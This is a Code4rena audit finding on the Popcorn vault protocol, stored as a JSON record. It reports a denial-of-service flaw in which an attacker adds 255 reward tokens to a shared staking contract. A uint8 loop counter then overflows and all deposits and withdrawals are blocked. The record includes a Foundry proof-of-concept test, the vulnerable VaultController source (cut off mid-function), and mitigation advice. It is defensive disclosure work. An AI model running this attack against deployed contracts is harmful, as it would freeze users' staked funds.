{
  "Title": "[M-32] DOS any Staking contract with Arithmetic Overflow",
  "Content": "\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110> \n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L112> \n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L127>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L141>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L170>\n\n<https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373>\n\n### Impact\n\nThis allows attackers to disable any Staking contract deployed via the system, essentially locking up all funds within the Staking contract. It would lead to a significant loss of funds for all users and the protocol who have staked their Vault tokens. All Staking contracts can be disabled by an attacker. The attack is possible once vault deployments become permissionless which is the primary goal of the Popcorn protocol.\n\n### Proof of Concept\n\nThe attack is possible because of the following behaviors:\n\n1.  Any Vault creator can use any Staking contract that was previously deployed by the system - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110>\n2.  Any Vault creator can add rewards tokens to the Staking contract attached to their Vault. Note that this Staking contract could be the same contract used by other vaults - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L448>\n3.  There are no checks to limit the number of rewardTokens added to a Staking contract - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263>\n4.  All critical functions in the Staking contract such as withdraw, deposit, transfer and claimRewards automatically call `accrueRewards` modifier.\n5.  `accrueRewards` iterates through all rewardTokens using a uint8 index variable - <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L373>\n\nFirst, `verifyCreatorOrOwner` needs to be fixed so that it allows either creator or owner to run functions it protects like it's meant to with the below code:\n\n```solidity\nif (msg.sender != metadata.creator && msg.sender != owner) revert NotSubmitterNorOwner(msg.sender);\n```\n\nOnce this fix is implemented and the protocol enables permissionless vault deployment, the following attack path opens up:\n\n1.  Some legit vaults have already been deployed by owner of the protocol or others and they have a Staking contract with significant funds\n2.  Attacker deploys vault using the same Staking contract deployed by any other vault owner/creator. This Staking contract is the target contract to be disabled.\n3.  Attacker adds 255 reward tokens to the Staking contract to trigger DOS in any future transactions in the Staking contract\n4.  Calling any transaction function in the Staking will always revert due to arithmetic overflow in the `accrueRewards` modifier that loops over all the `rewardTokens` state variable. The overflow is caused since the `i` variable used in the for loop inside accrueRewards uses uint8 and it keeps looping as long as `i < rewardTokens.length`. That means if `rewardTokens` has a length of 256, it will cause `i` uint8 variable to overflow.\n\nThe steps for described attack can be simulated with the below test that will need to be added to the `VaultController.t.sol` test file:\n\n```solidity\n  function test__disable_any_staking_contract() public {\n    addTemplate(\"Adapter\", templateId, adapterImpl, true, true);\n    addTemplate(\"Strategy\", \"MockStrategy\", strategyImpl, false, true);\n    addTemplate(\"Vault\", \"V1\", vaultImpl, true, true);\n\n    // 1. deploy regular legit vault owned by this\n    address vault = deployVault();\n    address staking = vaultRegistry.getVault(vault).staking;\n\n    vm.startPrank(alice);\n    // 2. deploy attacker-owned vault using the same Staking contract as legit vault\n    // alice is the attacker\n    address attackerVault = controller.deployVault(\n      VaultInitParams({\n        asset: iAsset,\n        adapter: IERC4626(address(0)),\n        fees: VaultFees({\n          deposit: 100,\n          withdrawal: 200,\n          management: 300,\n          performance: 400\n        }),\n        feeRecipient: feeRecipient,\n        owner: address(this)\n      }),\n      DeploymentArgs({ id: templateId, data: abi.encode(uint256(100)) }),\n      DeploymentArgs({ id: 0, data: \"\" }),\n      staking,\n      \"\",\n      VaultMetadata({\n        vault: address(0),\n        staking: staking,\n        creator: alice,\n        metadataCID: metadataCid,\n        swapTokenAddresses: swapTokenAddresses,\n        swapAddress: address(0x5555),\n        exchange: uint256(1)\n      }),\n      0\n    );\n\n    // 3. Attacker (Alice) adds 255 reward tokens to the Staking contract\n    bytes[] memory rewardsData = new bytes[](255);\n    address[] memory targets = new address[](255);\n    for (uint256 i = 0; i < 255; i++) {\n      address _rewardToken = address(\n        new MockERC20(\"Reward Token\", string(abi.encodePacked(i)), 18)\n      );\n\n      targets[i] = attackerVault;\n      rewardsData[i] = abi.encode(\n        _rewardToken,\n        0.1 ether,\n        0,\n        true,\n        10000000,\n        2 days,\n        1 days\n      );\n    }\n    controller.addStakingRewardsTokens(targets, rewardsData);\n\n    asset.mint(alice, 100 ether);\n    asset.approve(vault, 100 ether);\n    IVault(vault).deposit(100 ether, alice);\n    IVault(vault).approve(staking, 100 ether);\n\n    // 4. This Staking.deposit call or any other transaction will revert due to arithmetic overflow\n    // essentially locking all funds in the Staking contract.\n    IMultiRewardStaking(staking).deposit(90 ether, alice);\n    vm.stopPrank();\n  }\n```\n\nPlease be reminded to fix `verifyCreatorOwner` first before running the above test. Running the test above will cause the call to `Staking.deposit` to revert with an `Arithmetic over/underflow` error which shows that the Staking contract has successfully been DOS'd. The following is the command for running the test:\n\n    forge test --no-match-contract 'Abstract' --match-test test__disable_any_staking_contract\n\n### Tools Used\n\nVS Code, Foundry\n\n### Recommended Mitigation Steps\n\n1.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/vault/VaultController.sol#L108-L110> - users shouldn't be allowed to deploy using just any Staking contract for their vaults. Because of this, any Vault creator can manipulate a Staking contract which leads to the DOS attack path.\n2.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L263> - add a check to limit the number of rewardTokens that can be added to the Staking contract so that it does not grow unbounded.\n3.  <https://github.com/code-423n4/2023-01-popcorn/blob/main/src/utils/MultiRewardStaking.sol#L371-L382> - calculation in rewards accrual should be changed so that it does not have to iterate through all rewards tokens. There should be one global index used to keep track of rewards accrual and only that one storage variable will be updated so that gas cost does not increase linearly as more rewardTokens are added.\n\n**[RedVeil (Popcorn) confirmed](https://github.com/code-423n4/2023-01-popcorn-findings/issues/165)** \n\n**[LSDan (judge) decreased severity to Medium](https://github.com/code-423n4/2023-01-popcorn-findings/issues/165)** \n\n***\n\n",
  "Impact": "MEDIUM",
  "Source": "https://code4rena.com/reports/2023-01-popcorn",
  "Code": [
    {
      "filename": "src/vault/VaultController.sol",
      "content": "// SPDX-License-Identifier: GPL-3.0\n// Docgen-SOLC: 0.8.15\npragma solidity ^0.8.15;\n\nimport { SafeERC20Upgradeable as SafeERC20 } from \"openzeppelin-contracts-upgradeable/token/ERC20/utils/SafeERC20Upgradeable.sol\";\nimport { Owned } from \"../utils/Owned.sol\";\nimport { IVault, VaultInitParams, VaultFees } from \"../interfaces/vault/IVault.sol\";\nimport { IMultiRewardStaking } from \"../interfaces/IMultiRewardStaking.sol\";\nimport { IMultiRewardEscrow } from \"../interfaces/IMultiRewardEscrow.sol\";\nimport { IDeploymentController, ICloneRegistry } from \"../interfaces/vault/IDeploymentController.sol\";\nimport { ITemplateRegistry, Template } from \"../interfaces/vault/ITemplateRegistry.sol\";\nimport { IPermissionRegistry, Permission } from \"../interfaces/vault/IPermissionRegistry.sol\";\nimport { IVaultRegistry, VaultMetadata } from \"../interfaces/vault/IVaultRegistry.sol\";\nimport { IAdminProxy } from \"../interfaces/vault/IAdminProxy.sol\";\nimport { IERC4626, IERC20 } from \"../interfaces/vault/IERC4626.sol\";\nimport { IStrategy } from \"../interfaces/vault/IStrategy.sol\";\nimport { IAdapter } from \"../interfaces/vault/IAdapter.sol\";\nimport { IPausable } from \"../interfaces/IPausable.sol\";\nimport { DeploymentArgs } from \"../interfaces/vault/IVaultController.sol\";\n\n/**\n * @title   VaultController\n * @author  RedVeil\n * @notice  Admin contract for the vault ecosystem.\n *\n * Deploys Vaults, Adapter, Strategies and Staking contracts.\n * Calls admin functions on deployed contracts.\n */\ncontract VaultController is Owned {\n  using SafeERC20 for IERC20;\n\n  /*//////////////////////////////////////////////////////////////\n                               IMMUTABLES\n    //////////////////////////////////////////////////////////////*/\n\n  bytes32 public immutable VAULT = \"Vault\";\n  bytes32 public immutable ADAPTER = \"Adapter\";\n  bytes32 public immutable STRATEGY = \"Strategy\";\n  bytes32 public immutable STAKING = \"Staking\";\n  bytes4 internal immutable DEPLOY_SIG = bytes4(keccak256(\"deploy(bytes32,bytes32,bytes)\"));\n\n  error UnderlyingError(bytes revertReason);\n\n  /**\n   * @notice Constructor of this contract.\n   * @param _owner Owner of the contract. Controls management functions.\n   * @param _adminProxy `AdminProxy` ownes contracts in the vault ecosystem.\n   * @param _deploymentController `DeploymentController` with auxiliary deployment contracts.\n   * @param _vaultRegistry `VaultRegistry` to safe vault metadata.\n   * @param _permissionRegistry `permissionRegistry` to add endorsements and rejections.\n   * @param _escrow `MultiRewardEscrow` To escrow rewards of staking contracts.\n   */\n  constructor(\n    address _owner,\n    IAdminProxy _adminProxy,\n    IDeploymentController _deploymentController,\n    IVaultRegistry _vaultRegistry,\n    IPermissionRegistry _permissionRegistry,\n    IMultiRewardEscrow _escrow\n  ) Owned(_owner) {\n    adminProxy = _adminProxy;\n    vaultRegistry = _vaultRegistry;\n    permissionRegistry = _permissionRegistry;\n    escrow = _escrow;\n\n    _setDeploymentController(_deploymentController);\n\n    activeTemplateId[STAKING] = \"MultiRewardStaking\";\n    activeTemplateId[VAULT] = \"V1\";\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          VAULT DEPLOYMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  event VaultDeployed(address indexed vault, address indexed staking, address indexed adapter);\n\n  /**\n   * @notice Deploy a new Vault. Optionally with an Adapter and Staking. Caller must be owner.\n   * @param vaultData Vault init params.\n   * @param adapterData Encoded adapter init data.\n   * @param strategyData Encoded strategy init data.\n   * @param staking Address of staking contract to use for the vault. If 0, a new staking contract will be deployed.\n   * @param rewardsData Encoded data to add a rewards to the staking contract\n   * @param metadata Vault metadata for the `VaultRegistry` (Will be used by the frontend for additional informations)\n   * @param initialDeposit Initial deposit to the vault. If 0, no deposit will be made.\n   * @dev This function is the one stop solution to create a new vault with all necessary admin functions or auxiliery contracts.\n   */\n  function deployVault(\n    VaultInitParams memory vaultData,\n    DeploymentArgs memory adapterData,\n    DeploymentArgs memory strategyData,\n    address staking,\n    bytes memory rewardsData,\n    VaultMetadata memory metadata,\n    uint256 initialDeposit\n  ) external canCreate returns (address vault) {\n    IDeploymentController _deploymentController = deploymentController;\n\n    _verifyToken(address(vaultData.asset));\n    _verifyAdapterConfiguration(address(vaultData.adapter), adapterData.id);\n\n    if (adapterData.id > 0)\n      vaultData.adapter = IERC4626(_deployAdapter(vaultData.asset, adapterData, strategyData, _deploymentController));\n\n    vault = _deployVault(vaultData, _deploymentController);\n\n    if (staking == address(0)) staking = _deployStaking(IERC20(address(vault)), _deploymentController);\n\n    _registerCreatedVault(vault, staking, metadata);\n\n    if (rewardsData.length > 0) _handleVaultStakingRewards(vault, rewardsData);\n\n    emit VaultDeployed(vault, staking, address(vaultData.adapter));\n\n    _handleInitialDeposit(initialDeposit, IERC20(vaultData.asset), IERC4626(vault));\n  }\n\n  /// @notice Deploys a new vault contract using the `activeTemplateId`.\n  function _deployVault(VaultInitParams memory vaultData, IDeploymentController _deploymentController)\n    internal\n    returns (address vault)\n  {\n    vaultData.owner = address(adminProxy);\n\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(_deploymentController),\n      abi.encodeWithSelector(\n        DEPLOY_SIG,\n        VAULT,\n        activeTemplateId[VAULT],\n        abi.encodeWithSelector(IVault.initialize.selector, vaultData)\n      )\n    );\n    if (!success) revert UnderlyingError(returnData);\n\n    vault = abi.decode(returnData, (address));\n  }\n\n  /// @notice Registers newly created vault metadata.\n  function _registerCreatedVault(\n    address vault,\n    address staking,\n    VaultMetadata memory metadata\n  ) internal {\n    metadata.vault = vault;\n    metadata.staking = staking;\n    metadata.creator = msg.sender;\n\n    _registerVault(vault, metadata);\n  }\n\n  /// @notice Prepares and calls `addStakingRewardsTokens` for the newly created staking contract.\n  function _handleVaultStakingRewards(address vault, bytes memory rewardsData) internal {\n    address[] memory vaultContracts = new address[](1);\n    bytes[] memory rewardsDatas = new bytes[](1);\n\n    vaultContracts[0] = vault;\n    rewardsDatas[0] = rewardsData;\n\n    addStakingRewardsTokens(vaultContracts, rewardsDatas);\n  }\n\n  function _handleInitialDeposit(\n    uint256 initialDeposit,\n    IERC20 asset,\n    IERC4626 target\n  ) internal {\n    if (initialDeposit > 0) {\n      asset.safeTransferFrom(msg.sender, address(this), initialDeposit);\n      asset.approve(address(target), initialDeposit);\n      target.deposit(initialDeposit, msg.sender);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                      ADAPTER DEPLOYMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /**\n   * @notice Deploy a new Adapter with our without a strategy. Caller must be owner.\n   * @param asset Asset which will be used by the adapter.\n   * @param adapterData Encoded adapter init data.\n   * @param strategyData Encoded strategy init data.\n   */\n  function deployAdapter(\n    IERC20 asset,\n    DeploymentArgs memory adapterData,\n    DeploymentArgs memory strategyData,\n    uint256 initialDeposit\n  ) external canCreate returns (address adapter) {\n    _verifyToken(address(asset));\n\n    adapter = _deployAdapter(asset, adapterData, strategyData, deploymentController);\n\n    _handleInitialDeposit(initialDeposit, asset, IERC4626(adapter));\n  }\n\n  /**\n   * @notice Deploys an adapter and optionally a strategy.\n   * @dev Adds the newly deployed strategy to the adapter.\n   */\n  function _deployAdapter(\n    IERC20 asset,\n    DeploymentArgs memory adapterData,\n    DeploymentArgs memory strategyData,\n    IDeploymentController _deploymentController\n  ) internal returns (address) {\n    address strategy;\n    bytes4[8] memory requiredSigs;\n    if (strategyData.id > 0) {\n      strategy = _deployStrategy(strategyData, _deploymentController);\n      requiredSigs = templateRegistry.getTemplate(STRATEGY, strategyData.id).requiredSigs;\n    }\n\n    return\n      __deployAdapter(\n        adapterData,\n        abi.encode(asset, address(adminProxy), IStrategy(strategy), harvestCooldown, requiredSigs, strategyData.data),\n        _deploymentController\n      );\n  }\n\n  /// @notice Deploys an adapter and sets the management fee via `AdminProxy`\n  function __deployAdapter(\n    DeploymentArgs memory adapterData,\n    bytes memory baseAdapterData,\n    IDeploymentController _deploymentController\n  ) internal returns (address adapter) {\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(_deploymentController),\n      abi.encodeWithSelector(DEPLOY_SIG, ADAPTER, adapterData.id, _encodeAdapterData(adapterData, baseAdapterData))\n    );\n    if (!success) revert UnderlyingError(returnData);\n\n    adapter = abi.decode(returnData, (address));\n\n    adminProxy.execute(adapter, abi.encodeWithSelector(IAdapter.setPerformanceFee.selector, performanceFee));\n  }\n\n  /// @notice Encodes adapter init call. Was moved into its own function to fix \"stack too deep\" error.\n  function _encodeAdapterData(DeploymentArgs memory adapterData, bytes memory baseAdapterData)\n    internal\n    returns (bytes memory)\n  {\n    return\n      abi.encodeWithSelector(\n        IAdapter.initialize.selector,\n        baseAdapterData,\n        templateRegistry.getTemplate(ADAPTER, adapterData.id).registry,\n        adapterData.data\n      );\n  }\n\n  /// @notice Deploys a new strategy contract.\n  function _deployStrategy(DeploymentArgs memory strategyData, IDeploymentController _deploymentController)\n    internal\n    returns (address strategy)\n  {\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(_deploymentController),\n      abi.encodeWithSelector(DEPLOY_SIG, STRATEGY, strategyData.id, \"\")\n    );\n    if (!success) revert UnderlyingError(returnData);\n\n    strategy = abi.decode(returnData, (address));\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                    STAKING DEPLOYMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /**\n   * @notice Deploy a new staking contract. Caller must be owner.\n   * @param asset The staking token for the new contract.\n   * @dev Deploys `MultiRewardsStaking` based on the latest templateTemplateKey.\n   */\n  function deployStaking(IERC20 asset) external canCreate returns (address) {\n    _verifyToken(address(asset));\n    return _deployStaking(asset, deploymentController);\n  }\n\n  /// @notice Deploys a new staking contract using the activeTemplateId.\n  function _deployStaking(IERC20 asset, IDeploymentController _deploymentController)\n    internal\n    returns (address staking)\n  {\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(_deploymentController),\n      abi.encodeWithSelector(\n        DEPLOY_SIG,\n        STAKING,\n        activeTemplateId[STAKING],\n        abi.encodeWithSelector(IMultiRewardStaking.initialize.selector, asset, escrow, adminProxy)\n      )\n    );\n    if (!success) revert UnderlyingError(returnData);\n\n    staking = abi.decode(returnData, (address));\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                    VAULT MANAGEMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  error DoesntExist(address adapter);\n\n  /**\n   * @notice Propose a new Adapter. Caller must be creator of the vaults.\n   * @param vaults Vaults to propose the new adapter for.\n   * @param newAdapter New adapters to propose.\n   */\n  function proposeVaultAdapters(address[] calldata vaults, IERC4626[] calldata newAdapter) external {\n    uint8 len = uint8(vaults.length);\n\n    _verifyEqualArrayLength(len, newAdapter.length);\n\n    ICloneRegistry _cloneRegistry = cloneRegistry;\n    for (uint8 i = 0; i < len; i++) {\n      _verifyCreator(vaults[i]);\n      if (!_cloneRegistry.cloneExists(address(newAdapter[i]))) revert DoesntExist(address(newAdapter[i]));\n\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IVault.proposeAdapter.selector, newAdapter[i])\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Change adapter of a vault to the previously proposed adapter.\n   * @param vaults Addresses of the vaults to change\n   */\n  function changeVaultAdapters(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint8 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IVault.changeAdapter.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Sets new fees per vault. Caller must be creator of the vaults.\n   * @param vaults Addresses of the vaults to change\n   * @param fees New fee structures for these vaults\n   * @dev Value is in 1e18, e.g. 100% = 1e18 - 1 BPS = 1e12\n   */\n  function proposeVaultFees(address[] calldata vaults, VaultFees[] calldata fees) external {\n    uint8 len = uint8(vaults.length);\n\n    _verifyEqualArrayLength(len, fees.length);\n\n    for (uint8 i = 0; i < len; i++) {\n      _verifyCreator(vaults[i]);\n\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IVault.proposeFees.selector, fees[i])\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Change adapter of a vault to the previously proposed adapter.\n   * @param vaults Addresses of the vaults\n   */\n  function changeVaultFees(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint8 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IVault.changeFees.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          REGISTER VAULT\n    //////////////////////////////////////////////////////////////*/\n\n  IVaultRegistry public vaultRegistry;\n\n  /// @notice Call the `VaultRegistry` to register a vault via `AdminProxy`\n  function _registerVault(address vault, VaultMetadata memory metadata) internal {\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(vaultRegistry),\n      abi.encodeWithSelector(IVaultRegistry.registerVault.selector, metadata)\n    );\n    if (!success) revert UnderlyingError(returnData);\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                    ENDORSEMENT / REJECTION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /**\n   * @notice Set permissions for an array of target. Caller must be owner.\n   * @param targets `AdminProxy`\n   * @param newPermissions An array of permissions to set for the targets.\n   * @dev See `PermissionRegistry` for more details\n   */\n  function setPermissions(address[] calldata targets, Permission[] calldata newPermissions) external onlyOwner {\n    // No need to check matching array length since its already done in the permissionRegistry\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(permissionRegistry),\n      abi.encodeWithSelector(IPermissionRegistry.setPermissions.selector, targets, newPermissions)\n    );\n    if (!success) revert UnderlyingError(returnData);\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                      STAKING MANAGEMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n  /**\n   * @notice Adds a new rewardToken which can be earned via staking. Caller must be creator of the Vault or owner.\n   * @param vaults Vaults of which the staking contracts should be targeted\n   * @param rewardTokenData Token that can be earned by staking.\n   * @dev `rewardToken` - Token that can be earned by staking.\n   * @dev `rewardsPerSecond` - The rate in which `rewardToken` will be accrued.\n   * @dev `amount` - Initial funding amount for this reward.\n   * @dev `useEscrow Bool` - if the rewards should be escrowed on claim.\n   * @dev `escrowPercentage` - The percentage of the reward that gets escrowed in 1e18. (1e18 = 100%, 1e14 = 1 BPS)\n   * @dev `escrowDuration` - The duration of the escrow.\n   * @dev `offset` - A cliff after claim before the escrow starts.\n   * @dev See `MultiRewardsStaking` for more details.\n   */\n  function addStakingRewardsTokens(address[] memory vaults, bytes[] memory rewardTokenData) public {\n    _verifyEqualArrayLength(vaults.length, rewardTokenData.length);\n    address staking;\n    uint8 len = uint8(vaults.length);\n    for (uint256 i = 0; i < len; i++) {\n      (\n        address rewardsToken,\n        uint160 rewardsPerSecond,\n        uint256 amount,\n        bool useEscrow,\n        uint224 escrowDuration,\n        uint24 escrowPercentage,\n        uint256 offset\n      ) = abi.decode(rewardTokenData[i], (address, uint160, uint256, bool, uint224, uint24, uint256));\n      _verifyToken(rewardsToken);\n      staking = _verifyCreatorOrOwner(vaults[i]).staking;\n\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        rewardsToken,\n        abi.encodeWithSelector(IERC20.approve.selector, staking, type(uint256).max)\n      );\n      if (!success) revert UnderlyingError(returnData);\n\n      IERC20(rewardsToken).approve(staking, type(uint256).max);\n      IERC20(rewardsToken).transferFrom(msg.sender, address(adminProxy), amount);\n\n      (success, returnData) = adminProxy.execute(\n        staking,\n        abi.encodeWithSelector(\n          IMultiRewardStaking.addRewardToken.selector,\n          rewardsToken,\n          rewardsPerSecond,\n          amount,\n          useEscrow,\n          escrowDuration,\n          escrowPercentage,\n          offset\n        )\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Changes rewards speed for a rewardToken. This works only for rewards that accrue over time. Caller must be creator of the Vault.\n   * @param vaults Vaults of which the staking contracts should be targeted\n   * @param rewardTokens Token that can be earned by staking.\n   * @param rewardsSpeeds The rate in which `rewardToken` will be accrued.\n   * @dev See `MultiRewardsStaking` for more details.\n   */\n  function changeStakingRewardsSpeeds(\n    address[] calldata vaults,\n    IERC20[] calldata rewardTokens,\n    uint160[] calldata rewardsSpeeds\n  ) external {\n    uint8 len = uint8(vaults.length);\n\n    _verifyEqualArrayLength(len, rewardTokens.length);\n    _verifyEqualArrayLength(len, rewardsSpeeds.length);\n\n    address staking;\n    for (uint256 i = 0; i < len; i++) {\n      staking = _verifyCreator(vaults[i]).staking;\n\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        staking,\n        abi.encodeWithSelector(IMultiRewardStaking.changeRewardSpeed.selector, rewardTokens[i], rewardsSpeeds[i])\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Funds rewards for a rewardToken.\n   * @param vaults Vaults of which the staking contracts should be targeted\n   * @param rewardTokens Token that can be earned by staking.\n   * @param amounts The amount of rewardToken that will fund this reward.\n   * @dev See `MultiRewardStaking` for more details.\n   */\n  function fundStakingRewards(\n    address[] calldata vaults,\n    IERC20[] calldata rewardTokens,\n    uint256[] calldata amounts\n  ) external {\n    uint8 len = uint8(vaults.length);\n\n    _verifyEqualArrayLength(len, rewardTokens.length);\n    _verifyEqualArrayLength(len, amounts.length);\n\n    address staking;\n    for (uint256 i = 0; i < len; i++) {\n      staking = vaultRegistry.getVault(vaults[i]).staking;\n\n      rewardTokens[i].transferFrom(msg.sender, address(this), amounts[i]);\n      IMultiRewardStaking(staking).fundReward(rewardTokens[i], amounts[i]);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                      ESCROW MANAGEMENT LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  IMultiRewardEscrow public escrow;\n\n  /**\n   * @notice Set fees for multiple tokens. Caller must be the owner.\n   * @param tokens Array of tokens.\n   * @param fees Array of fees for `tokens` in 1e18. (1e18 = 100%, 1e14 = 1 BPS)\n   * @dev See `MultiRewardEscrow` for more details.\n   */\n  function setEscrowTokenFees(IERC20[] calldata tokens, uint256[] calldata fees) external onlyOwner {\n    _verifyEqualArrayLength(tokens.length, fees.length);\n    (bool success, bytes memory returnData) = adminProxy.execute(\n      address(escrow),\n      abi.encodeWithSelector(IMultiRewardEscrow.setFees.selector, tokens, fees)\n    );\n    if (!success) revert UnderlyingError(returnData);\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          TEMPLATE LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /**\n   * @notice Adds a new templateCategory to the registry. Caller must be owner.\n   * @param templateCategories A new category of templates.\n   * @dev See `TemplateRegistry` for more details.\n   */\n  function addTemplateCategories(bytes32[] calldata templateCategories) external onlyOwner {\n    address _deploymentController = address(deploymentController);\n    uint8 len = uint8(templateCategories.length);\n    for (uint256 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        _deploymentController,\n        abi.encodeWithSelector(IDeploymentController.addTemplateCategory.selector, templateCategories[i])\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /**\n   * @notice Toggles the endorsement of a templates. Caller must be owner.\n   * @param templateCategories TemplateCategory of the template to endorse.\n   * @param templateIds TemplateId of the template to endorse.\n   * @dev See `TemplateRegistry` for more details.\n   */\n  function toggleTemplateEndorsements(bytes32[] calldata templateCategories, bytes32[] calldata templateIds)\n    external\n    onlyOwner\n  {\n    uint8 len = uint8(templateCategories.length);\n    _verifyEqualArrayLength(len, templateIds.length);\n\n    address _deploymentController = address(deploymentController);\n    for (uint256 i = 0; i < len; i++) {\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        address(_deploymentController),\n        abi.encodeWithSelector(\n          ITemplateRegistry.toggleTemplateEndorsement.selector,\n          templateCategories[i],\n          templateIds[i]\n        )\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                          PAUSING LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  /// @notice Pause Deposits and withdraw all funds from the underlying protocol. Caller must be owner or creator of the Vault.\n  function pauseAdapters(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint256 i = 0; i < len; i++) {\n      _verifyCreatorOrOwner(vaults[i]);\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        IVault(vaults[i]).adapter(),\n        abi.encodeWithSelector(IPausable.pause.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /// @notice Pause deposits. Caller must be owner or creator of the Vault.\n  function pauseVaults(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint256 i = 0; i < len; i++) {\n      _verifyCreatorOrOwner(vaults[i]);\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IPausable.pause.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /// @notice Unpause Deposits and deposit all funds into the underlying protocol. Caller must be owner or creator of the Vault.\n  function unpauseAdapters(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint256 i = 0; i < len; i++) {\n      _verifyCreatorOrOwner(vaults[i]);\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        IVault(vaults[i]).adapter(),\n        abi.encodeWithSelector(IPausable.unpause.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /// @notice Unpause deposits. Caller must be owner or creator of the Vault.\n  function unpauseVaults(address[] calldata vaults) external {\n    uint8 len = uint8(vaults.length);\n    for (uint256 i = 0; i < len; i++) {\n      _verifyCreatorOrOwner(vaults[i]);\n      (bool success, bytes memory returnData) = adminProxy.execute(\n        vaults[i],\n        abi.encodeWithSelector(IPausable.unpause.selector)\n      );\n      if (!success) revert UnderlyingError(returnData);\n    }\n  }\n\n  /*//////////////////////////////////////////////////////////////\n                       VERIFICATION LOGIC\n    //////////////////////////////////////////////////////////////*/\n\n  error NotSubmitterNorOwner(address caller);\n  error NotSubmitter(address caller);\n  error NotAllowed(address subject);\n  error AdapterConfigFaulty();\n  error ArrayLengthMissmatch();\n\n  /// @notice Verify that the caller is the creator of the vault or owner of `VaultController` (admin rights).\n  function _verifyCreatorOrOwner(address vault) internal returns (VaultMetadata memory metadata) {\n    metadata = vaultRegistry.getVault(vault);\n    if (msg.sender != metadata.creator || msg.sender != owner) revert NotSubmitterNorOwner(msg.sender);\n  }\n\n  /// @notice Verify that the caller is the creator of the vault.\n  function _verifyCreator(address vault) internal view returns (VaultMetadata memory metadata) {\n    metadata = vaultRegistry.getVault(vault);\n    if (msg.sender != metadata.creator) revert NotSubmitter(msg.sender);\n  }\n\n  /// @notice Verify that the token is not rejected nor a clone.\n  function _verifyToken(address token) internal view {\n    if (\n      (\n        permissionRegistry.endorsed(address(0))\n          ? !permissionRegistry.endorsed(token)\n          : permissionRegistry.rejected(token)\n      ) ||\n      cloneRegistry.cloneExists(token) ||\n      token == address(0)\n    ) revert NotAllowed(token);\n  